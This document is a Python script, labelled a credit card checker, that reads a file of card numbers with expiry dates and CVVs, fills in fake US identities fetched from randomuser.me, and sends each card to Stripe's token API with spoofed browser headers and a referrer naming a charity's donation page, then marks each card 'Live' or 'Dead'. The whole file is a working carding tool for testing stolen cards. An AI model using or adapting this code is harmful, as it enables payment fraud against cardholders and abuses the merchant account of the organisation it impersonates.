import json
import requests
import random
import argparse
import sys
from colorama import Fore, Style
def read_api_key(api_key_file):
    try:
        with open(api_key_file, 'r') as key_file:
            api_key = key_file.read().strip()
        return api_key
    except FileNotFoundError:
        print(f"Error: API key file '{api_key_file}' not found.")
        sys.exit(1)

def randomizer():
    randomocontent = requests.get('https://randomuser.me/api/1.2/?nat=us')
    jsonrandom = randomocontent.json()
    return jsonrandom

def validate_card_format(cc):
    try:
        splitter = cc.split('|')
        if len(splitter) != 4:
            raise ValueError("Invalid card format")
    except ValueError as e:
        print(f"Error: {e}")
        sys.exit(1)

def checker(cc, jsonrandom, api_key):
    splitter = cc.split('|')
    ccnum = splitter[0]
    month = splitter[1]
    year = splitter[2]
    cvv = splitter[3]

    firstname = jsonrandom["results"][0]["name"]["first"]
    lastname = jsonrandom["results"][0]["name"]["last"]
    street = jsonrandom["results"][0]["location"]["street"]
    city = jsonrandom["results"][0]["location"]["city"]
    postcode = jsonrandom["results"][0]["location"]["postcode"]
    email = jsonrandom["results"][0]["email"]
    state = jsonrandom["results"][0]["location"]["state"]

    url = 'https://api.stripe.com/v1/tokens'
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'origin': 'https://checkout.stripe.com',
        'sec-fetch-dest': 'empty',
        'accept-language': 'en-GB',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'referer': 'https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=31d5b0c4-70c8-d34b-8f08-71046ff10298',
    }

    data = {
        'email': email,
        'validation_type': 'card',
        'payment_user_agent': 'Stripe Checkout v3 checkout-manhattan (stripe.js/a44017d)',
        'referrer': 'https://www.tangaroablue.org/about-us/donate/',
        'pasted_fields': 'number',
        'card[number]': ccnum,
        'card[exp_month]': month,
        'card[exp_year]': year,
        'card[cvc]': cvv,
        'card[name]': firstname,
        'card[address_line1]': street,
        'card[address_city]': city,
        'card[address_state]': state,
        'card[address_zip]': postcode,
        'card[address_country]': 'United States',
        'time_on_page': '132527',
        'guid': 'NA',
        'muid': '14bec475-2279-4ba5-87ce-1b4c2bf2dd04',
        'sid': '731a3414-ff88-440a-b64e-f77a878f71b2',
        'key': api_key  # Include the API key obtained from the text file
    }

    try:
        response = requests.post(url, headers=headers, data=data)
        json_response = response.json()

        # Debug print to see the request being made
        print(f"Request for {ccnum}: {response.status_code} - {json_response}")

        if response.status_code == 200:
            if json_response["card"]["cvc_check"] == "pass":
                print(f"{Fore.GREEN}| {ccnum} | {cvv} | {month}/{year} | Valid Luhn check | Live{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}| {ccnum} | {cvv} | {month}/{year} | Valid Luhn check | Dead{Style.RESET_ALL}")

        elif response.status_code == 402:
            if json_response["error"]["code"] == "incorrect_cvc":
                print(f"{Fore.RED}| {ccnum} | {cvv} | {month}/{year} | Valid Luhn check | Dead{Style.RESET_ALL}")
            elif json_response["error"]["code"] == "card_declined":
                print(f"{Fore.RED}| {ccnum} | {cvv} | {month}/{year} | Valid Luhn check | Dead{Style.RESET_ALL}")
            elif json_response["error"]["code"] == "expired_card":
                print(f"{Fore.RED}| {ccnum} | {cvv} | {month}/{year} | Valid Luhn check | Dead{Style.RESET_ALL}")
    except Exception as e:
        print(f"Error Occurred: {e}")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description='Credit card checker')
    parser.add_argument('--cards', type=str, help='Path to the card file list')
    parser.add_argument('--key', type=str, help='Path to the API key file')

    args = parser.parse_args()

    if not args.cards or not args.key:
        print("Error: Both --cards and --key arguments are required.")
        sys.exit(1)

    cards_file_path = args.cards
    api_key_path = args.key

    # Validate API key file existence
    api_key = read_api_key(api_key_path)

    with open(cards_file_path, 'r') as f:
        lines = f.readlines()

    for line in lines:
        cc = line.strip()

        # Validate card format
        validate_card_format(cc)

        checker(cc, randomizer(), api_key)
        print('--------------------------------------------------------------------')

if __name__ == "__main__":
    main()
